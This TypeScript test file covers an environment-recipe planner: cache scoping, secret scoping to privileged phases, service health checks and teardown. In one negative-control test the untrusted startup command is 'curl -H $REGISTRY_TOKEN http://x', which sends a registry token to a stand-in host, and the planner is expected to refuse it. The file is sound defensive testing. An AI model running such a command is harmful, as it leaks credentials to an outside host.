import assert from "node:assert/strict";
import { test } from "node:test";
import {
  assessTeardown, cacheKey, planRun, recipeDigest, teardownPlan, validateRecipe, validateRecipeLifecycle,
  type CacheEntry, type CommandResult, type EnvironmentRecipe, type RecipeRunner, type RunState,
} from "./environment-recipe.js";
import { checkReadinessInputs } from "./stack-detect.js";

const recipe = (over: Partial<EnvironmentRecipe> = {}): EnvironmentRecipe => ({
  version: "1",
  phases: {
    initialise: { command: "prepare-image", timeoutMs: 1000, trust: "privileged" },
    refresh: { command: "pnpm install --offline", timeoutMs: 60_000, trust: "untrusted-repo" },
    startup: { command: "pnpm run dev &", timeoutMs: 30_000, trust: "untrusted-repo" },
    teardown: { command: "true", timeoutMs: 20, trust: "privileged" },
  },
  test: { command: "pnpm test", timeoutMs: 60_000 },
  services: [{ name: "db", image: "postgres:16", healthCheck: { kind: "tcp", target: "", timeoutMs: 20, retries: 2 }, port: { kind: "discover" } }],
  cachePolicy: { keys: ["pnpm-lock.yaml"], scope: "project-only" },
  secrets: { names: ["REGISTRY_TOKEN"], scope: { REGISTRY_TOKEN: ["initialise"] } },
  ...over,
});
// image preparation is privileged and holds the secret; repo code never sees it.
const privInit = (): EnvironmentRecipe => recipe();
const inputs = { lockfiles: { "pnpm-lock.yaml": "lock-v1" }, image: "sha256:img1" };
const entryFor = (r: EnvironmentRecipe, projectId: string, over: Partial<CacheEntry> = {}): CacheEntry => ({
  projectId, recipeVersion: r.version, key: cacheKey(r, projectId, inputs), recordedIntegrity: "abc", observedIntegrity: "abc", ...over,
});
const stateWith = (cache: CacheEntry | null, projectId = "p1"): RunState => ({ projectId, inputs, cache });
const names = (p: ReturnType<typeof planRun>) => p.steps.map((s) => `${s.phase}:${s.name}`);

test("recipeDigest records the recipe with the build inputs and is order-independent", () => {
  const a = recipeDigest(recipe(), inputs);
  assert.equal(a.digest, recipeDigest(JSON.parse(JSON.stringify(recipe())), inputs).digest);
  const r2 = recipe(); r2.version = "2";
  assert.notEqual(recipeDigest(r2, inputs).digest, a.digest);
  assert.notEqual(recipeDigest(recipe(), { ...inputs, lockfiles: { "pnpm-lock.yaml": "lock-v2" } }).digest, a.digest);
  // reuses stack-detect's staleness check
  assert.equal(checkReadinessInputs(a, { ...inputs, recipe: JSON.stringify(JSON.parse(JSON.stringify(recipe()))) }).status, "stale", "canonical form, not raw JSON, is recorded");
});

test("fresh run: initialise, services, startup, test; cached run swaps initialise for refresh", () => {
  const fresh = planRun(recipe(), stateWith(null));
  assert.equal(fresh.mode, "fresh");
  assert.deepEqual(names(fresh), ["initialise:initialise", "startup:db", "startup:db", "startup:startup", "test:test"]);
  assert.equal(fresh.writeCache, true);
  const r = recipe();
  const cached = planRun(r, stateWith(entryFor(r, "p1")));
  assert.equal(cached.mode, "cached");
  assert.equal(cached.steps[0].name, "refresh");
  assert.ok(!names(cached).includes("initialise:initialise"));
  assert.equal(cached.writeCache, false);
});

test("negative control: cache from another project is refused, never reused", () => {
  const r = recipe();
  const p = planRun(r, stateWith(entryFor(r, "other-project"), "p1"));
  assert.equal(p.cache.use, false);
  assert.equal(p.cache.reason, "other-project");
  assert.equal(p.steps[0].name, "initialise");
  // even with a key forged to match p1's inputs, the project id on the entry decides
  const forged = entryFor(r, "other-project", { key: cacheKey(r, "p1", inputs) });
  assert.equal(planRun(r, stateWith(forged, "p1")).cache.reason, "other-project");
});

test("negative control: stale cache (lockfile changed, recipe bumped) is discarded with the reason", () => {
  const r = recipe();
  const e = entryFor(r, "p1");
  const changed: RunState = { projectId: "p1", cache: e, inputs: { ...inputs, lockfiles: { "pnpm-lock.yaml": "lock-v2" } } };
  const p = planRun(r, changed);
  assert.equal(p.cache.reason, "inputs-changed");
  assert.equal(p.steps[0].name, "initialise");
  const r2 = recipe({ version: "2" });
  assert.equal(planRun(r2, stateWith(e)).cache.reason, "recipe-version");
  assert.equal(planRun(r, { projectId: "p1", cache: e, inputs: { ...inputs, image: "sha256:img2" } }).cache.reason, "inputs-changed");
});

test("corrupt cache and a cache carrying secrets are discarded", () => {
  const r = recipe();
  assert.equal(planRun(r, stateWith(entryFor(r, "p1", { observedIntegrity: "zzz" }))).cache.reason, "corrupt");
  const s = planRun(r, stateWith(entryFor(r, "p1", { carriesSecrets: ["REGISTRY_TOKEN"] })));
  assert.equal(s.cache.reason, "carries-secrets");
  assert.equal(s.steps[0].name, "initialise");
});

test("negative control: clean mode ignores a perfectly valid cache and never refreshes", () => {
  const r = recipe();
  const p = planRun(r, stateWith(entryFor(r, "p1")), { clean: true });
  assert.equal(p.mode, "clean");
  assert.equal(p.cache.reason, "clean");
  assert.equal(p.steps[0].name, "initialise");
  assert.ok(!names(p).some((n) => n.endsWith(":refresh")));
});

test("negative control: secrets scoped to an untrusted-repo phase make planning refuse", () => {
  const leaky = recipe();
  leaky.phases.initialise = { command: "pnpm install", timeoutMs: 1000, trust: "untrusted-repo" };
  const p = planRun(leaky, stateWith(null));
  assert.equal(p.ok, false);
  assert.equal(p.steps.length, 0);
  assert.match(p.refusals.join(), /REGISTRY_TOKEN is scoped to untrusted-repo phase initialise/);
  const viaCommand = privInit();
  viaCommand.phases.startup.command = "curl -H $REGISTRY_TOKEN http://x";
  assert.match(planRun(viaCommand, stateWith(null)).refusals.join(), /untrusted command references secret REGISTRY_TOKEN/);
  const viaTest = privInit();
  viaTest.test = { command: "echo ${REGISTRY_TOKEN}", timeoutMs: 100 };
  assert.match(validateRecipe(viaTest).join(), /test command references secret/);
});

test("privileged steps are reserved for image preparation; scoped secret goes only to that step", () => {
  const ok = privInit();
  assert.deepEqual(validateRecipe(ok), []);
  const p = planRun(ok, stateWith(null));
  assert.deepEqual(p.steps[0].secrets, ["REGISTRY_TOKEN"]);
  assert.ok(p.steps.slice(1).every((s) => s.secrets.length === 0 && s.trust === "untrusted-repo" || s.name === "startup"));
  assert.ok(p.steps.filter((s) => s.trust === "untrusted-repo").every((s) => s.secrets.length === 0));
  const bad = privInit();
  bad.phases.startup.trust = "privileged";
  assert.match(validateRecipe(bad).join(), /phase startup: privileged is reserved/);
});

test("validateRecipe bounds commands, timeouts, health budgets and cache scope", () => {
  const bad = recipe({ cachePolicy: { keys: [], scope: "shared" as never } });
  bad.phases.initialise.timeoutMs = 0;
  bad.phases.refresh.command = "x".repeat(8001);
  bad.services[0].healthCheck = { kind: "command", target: "", timeoutMs: 60_000, retries: 5 };
  const issues = validateRecipe(bad).join("\n");
  assert.match(issues, /initialise: timeoutMs/);
  assert.match(issues, /exceeds 8000/);
  assert.match(issues, /project-only/);
  assert.match(issues, /budget exceeds/);
  assert.match(issues, /needs a target/);
});

test("teardownPlan stops services in reverse, kills processes, and leftovers are failures", () => {
  const t = teardownPlan(recipe(), { services: ["a", "b"], processes: ["dev-server"] });
  assert.deepEqual(t.stopServices, ["b", "a"]);
  assert.deepEqual(t.killProcesses, ["dev-server"]);
  assert.equal(assessTeardown(true, []).ok, true);
  const bad = assessTeardown(true, ["pid 42 dev-server"]);
  assert.equal(bad.ok, false);
  assert.match(bad.failures[0], /leftover after teardown: pid 42/);
  assert.equal(assessTeardown(false, []).ok, false);
});

// ------------------------------------------------------------ fake runner

interface Faults { missingService?: boolean; unhealthy?: boolean; noPort?: boolean; hang?: string; fail?: Record<string, number>; leak?: boolean; seen?: { phase: string; trust: string; secrets: string[] }[] }
function fakeRunner(f: Faults = {}): RecipeRunner & { alive: Set<string> } {
  const alive = new Set<string>();
  return {
    alive,
    async run(step) {
      f.seen?.push({ phase: step.phase, trust: step.trust, secrets: step.secrets });
      if (f.hang === step.phase) { alive.add(`proc:${step.phase}`); return new Promise<CommandResult>(() => {}); }
      if (step.phase === "startup") alive.add("proc:dev-server");
      return { exitCode: f.fail?.[step.phase] ?? 0 };
    },
    async startService(s) {
      if (f.missingService) throw new Error(`image ${s.image} not found`);
      alive.add(`svc:${s.name}`);
      return { handle: `svc:${s.name}`, port: f.noPort ? undefined : 5432 };
    },
    async probe() { return !f.unhealthy; },
    async stopService(h) { alive.delete(h); },
    async killProcess(id) { if (!f.leak) alive.delete(id); },
    async leftovers() { return [...alive]; },
    async listProcesses() { return [...alive].filter((a) => a.startsWith("proc:")); },
  };
}
const summary = (r: Awaited<ReturnType<typeof validateRecipeLifecycle>>) => r.outcomes.map((o) => `${o.phase}/${o.step}:${o.status}${o.failureClass ? "/" + o.failureClass : ""}`);

test("lifecycle passes fresh and cached with a healthy runner and leaves nothing behind", async () => {
  const r = privInit();
  const seen: NonNullable<Faults["seen"]> = [];
  const run1 = fakeRunner({ seen });
  const fresh = await validateRecipeLifecycle(run1, r, stateWith(null));
  assert.equal(fresh.ok, true, JSON.stringify(fresh.outcomes));
  assert.equal(run1.alive.size, 0);
  assert.ok(seen.every((s) => s.trust === "privileged" || s.secrets.length === 0), "no secret reached untrusted code");
  assert.deepEqual(seen.find((s) => s.phase === "initialise")?.secrets, ["REGISTRY_TOKEN"]);
  const cached = await validateRecipeLifecycle(fakeRunner(), r, stateWith(entryFor(r, "p1")));
  assert.equal(cached.ok, true);
  assert.equal(cached.plan.mode, "cached");
  assert.ok(cached.outcomes.some((o) => o.step === "refresh"));
});

test("lifecycle: missing service is an environment failure, later steps skipped, teardown still clean", async () => {
  const run = fakeRunner({ missingService: true });
  const rep = await validateRecipeLifecycle(run, privInit(), stateWith(null));
  assert.equal(rep.ok, false);
  const s = summary(rep);
  assert.ok(s.includes("startup/db:fail/environment"), s.join());
  assert.ok(s.includes("test/test:skipped"));
  assert.ok(s.includes("teardown/teardown:pass"));
  assert.match(rep.outcomes.find((o) => o.status === "fail")!.detail, /not found/);
});

test("lifecycle: unhealthy service and undiscovered port are environment failures", async () => {
  const a = await validateRecipeLifecycle(fakeRunner({ unhealthy: true }), privInit(), stateWith(null));
  assert.ok(summary(a).includes("startup/db:fail/environment"));
  assert.match(a.outcomes.find((o) => o.status === "fail")!.detail, /after 3 attempts/);
  const b = await validateRecipeLifecycle(fakeRunner({ noPort: true }), privInit(), stateWith(null));
  assert.match(b.outcomes.find((o) => o.status === "fail")!.detail, /no port/);
  assert.equal(b.teardown.ok, true);
});

test("lifecycle: corrupt cache is discarded, the run falls back to initialise and passes", async () => {
  const r = privInit();
  const rep = await validateRecipeLifecycle(fakeRunner(), r, stateWith(entryFor(r, "p1", { observedIntegrity: "bad" })));
  assert.equal(rep.plan.cache.reason, "corrupt");
  assert.equal(rep.ok, true);
  assert.ok(rep.outcomes.some((o) => o.step === "initialise" && o.status === "pass"));
});

test("lifecycle: repository test failure is classed repository; privileged failure environment", async () => {
  const t = await validateRecipeLifecycle(fakeRunner({ fail: { test: 1 } }), privInit(), stateWith(null));
  assert.ok(summary(t).includes("test/test:fail/repository"));
  const p = await validateRecipeLifecycle(fakeRunner({ fail: { initialise: 1 } }), privInit(), stateWith(null));
  assert.ok(summary(p).includes("initialise/initialise:fail/environment"));
});

test("lifecycle: hanging process is cut off by the deadline, killed, and teardown is clean", async () => {
  const r = privInit();
  r.phases.startup.timeoutMs = 30;
  const run = fakeRunner({ hang: "startup" });
  const rep = await validateRecipeLifecycle(run, r, stateWith(null));
  assert.equal(rep.ok, false);
  assert.ok(summary(rep).includes("startup/startup:fail/repository"));
  assert.match(rep.outcomes.find((o) => o.status === "fail")!.detail, /timed out/);
  assert.equal(run.alive.size, 0, "background process and service were cleaned up");
});

test("negative control: a process teardown cannot kill is reported as a failure, not ignored", async () => {
  const run = fakeRunner({ leak: true });
  const rep = await validateRecipeLifecycle(run, privInit(), stateWith(null));
  assert.equal(rep.ok, false);
  assert.equal(rep.teardown.ok, false);
  assert.match(rep.teardown.failures.join(), /leftover after teardown: proc:dev-server/);
  assert.ok(summary(rep).includes("teardown/teardown:fail/environment"));
});

test("an invalid recipe never reaches the runner", async () => {
  const seen: NonNullable<Faults["seen"]> = [];
  const leaky = recipe();
  leaky.phases.initialise.trust = "untrusted-repo";
  const rep = await validateRecipeLifecycle(fakeRunner({ seen }), leaky, stateWith(null));
  assert.equal(rep.ok, false);
  assert.equal(seen.length, 0);
});
